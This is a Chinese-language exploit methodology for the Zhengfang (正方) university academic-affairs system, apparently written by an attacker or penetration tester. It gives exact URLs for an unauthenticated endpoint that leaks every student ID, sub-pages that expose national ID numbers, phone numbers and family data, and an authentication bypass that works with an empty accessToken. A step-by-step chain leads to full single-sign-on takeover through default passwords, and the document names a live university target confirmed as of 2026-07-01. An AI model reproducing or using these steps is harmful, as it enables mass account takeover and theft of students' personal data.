# 正方教务 Mobile 隐藏接口挖掘方法论

## 核心发现

正方教务系统的 Mobile 版接口校验比 PC 版更弱，通过命名规律推导可以找到大量隐藏 API。

## 命名规律

```
PC版索引:    {模块名}_cx{功能名}Index.html     → xsgrxxwh_cxXsGrxxxgIndex.html
PC版简化:    {模块名}_cx{功能名}.html          → xsgrxxwh_cxXsgrxx.html
Mobile版:    {模块名}Mobile_cx{功能名}.html    → xsgrxxwhMobile_cxXh_ids.html
Mobile子页:  {模块名}Mobile_cx{功能名}App.html → xsgrxxwhMobile_cxXsgrxxApp.html
照片Mobile:  xszpcxMobile_cx{功能}Index.html   → xszpcxMobile_cxXszpIndex.html
```

## 目录缩写含义

| 缩写 | 全称 | 含义 |
|------|------|------|
| xs | 学生 | 学生模块 |
| xxx | 学生相/学生信息 | 学生个人资料 |
| x | 信息 | 数据信息 |
| gl | 管理 | 增删改查 |
| cx | 查询 | 查询操作 |
| wh | 维护 | 增删改维护 |
| zp | 照片 | 学生照片 |
| grxx | 个人信息 | 个人资料 |
| jtcy | 家庭成员 | 家庭信息 |
| xj | 学籍 | 学籍信息 |
| cj | 成绩 | 成绩数据 |
| jbxx | 基本信息 | 基本信息 |
| xh | 学号 | 学生学号 |

## 关键漏洞接口

### 1. 学号批量泄露
```
GET /jwglxt/xsxxxggl/xsgrxxwhMobile_cxXh_ids.html
→ 返回全校所有学号的 JSON 数组
→ 无参数，无需 gnmkdm
→ 示例返回: 101,035 条学号
```

### 2. Mobile 个人信息子页面（无 gnmkdm 校验）
```
/xsxxxggl/xsgrxxwhMobile_cxXsgrxxApp.html  → 基本信息（含身份证号）
/xsxxxggl/xsgrxxwhMobile_cxXjxxApp.html    → 学籍信息
/xsxxxggl/xsgrxxwhMobile_cxQtxxApp.html    → 其他信息
/xsxxxggl/xsgrxxwhMobile_cxLxfsApp.html    → 联系方式（含手机号）
/xsxxxggl/xsgrxxwhMobile_cxXsjtcyApp.html  → 家庭成员
/xsxxxggl/xsgrxxwhMobile_cxXsJlcfxxApp.html→ 奖惩信息
/xsxxxggl/xsgrxxwhMobile_cxXsxkxxApp.html  → 选课信息
```

发现方法：访问 PC 版菜单页面 → 查看 input.url 隐藏域 → 提取所有子页面路径。

### 3. 认证绕过 (auth_cxVanyIndex)
```
GET /jwglxt/auth/auth_cxVanyIndex.html?userId={学号}&role=xs&accessToken=
→ accessToken 为空时直接以 userId 创建会话
→ 可切换到任意学生身份
→ 结合学号泄露 → 接管全校任意账号
```

发现方法：
- 从 login.js 中发现 /auth/ 模块
- 命名枚举：auth_cx + 功能名
- 或从 SSO 跳转链抓包 (Burp) 中截获
- 已确认在 JS 文件 login.js 中有: `/auth/auth_cxJwLoginZt.html`

## 攻击链

```
Step 1: 学号泄露
  xsgrxxwhMobile_cxXh_ids.html → 101K 学号

Step 2: 认证绕过
  auth_cxVanyIndex.html?userId={学号}&accessToken= → 任意身份切换

Step 3: 信息获取
  xsgrxxwh_cxXsgrxx.html → 身份证号 + 手机号 + QQ + 全部个人信息

Step 4: CAS 默认密码
  身份证后6位 → cas.ecut.edu.cn → SSO 接管全部系统
```

## 发现方法总结

| 步骤 | 方法 | 工具 |
|------|------|------|
| 收集 PC 版路径 | 菜单 clickMenu → 提取 URL | 浏览器 JS |
| 读业务 JS | 页面加载的 comp/ 下 JS 文件 | 浏览器直接访问 |
| 提取 Mobile 子页 | input.url 隐藏域 | F12 Elements |
| 命名枚举 | 套用 Mobile/_ids/_App 规律 | 浏览器地址栏 |
| SSO 抓包 | 退出重登，抓 302 跳转链 | Burp + Chrome 代理 |
| 验证 auth 绕过 | accessToken= 置空 + 换 userId | Burp Repeater |

## 已确认有效站点

- 东华理工大学: 172-20-130-13.atrust.ecut.edu.cn (2026-07-01)
